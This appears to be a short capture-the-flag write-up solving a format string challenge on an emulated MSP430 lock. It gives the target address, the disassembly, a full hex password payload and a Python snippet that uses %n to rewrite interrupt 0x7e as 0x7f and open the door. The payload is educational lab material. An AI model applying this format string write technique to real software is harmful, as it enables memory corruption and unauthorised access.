Another format string vulnerability but we have to write a larger value to a target address to do what we want.  

To make it easier on myself i searched around for something where i only needed to write 1 byte for exploitation.  

Turns out that there is the usual conditional_unlock_door which calls interrupt 0x7e.. we can just overwrite the 7e with 7f to auto unlock the door when it is called.

so our target address is:  44c8

44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>

it is the same set up where the 1st item in the memory inspection with %x is our input.  so my first 2 bytes are the target address to write to, then I need to fill enough junk to count up to 7f..

0x7f = 127 in decimal.   Since we already have 2 bytes written from the target address we want 125 bytes of junk.  
%125x did not seem to work with this printf.. so I had to just write out all of the bytes on my own..
so I pasted "JUNK" a bunch of times until i hit 125 bytes

pw:
c8444a554e4b4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A554E4B4A256e
input = ""
input += "\xc8\x44"               # target write address
input += "JUNK" * 31              # 124 bytes of JUNK
input += "J"                      # had to add 1 more char to make it 125 for a total of 0x7f bytes written before %n
input += "%n"                     # write value to target address
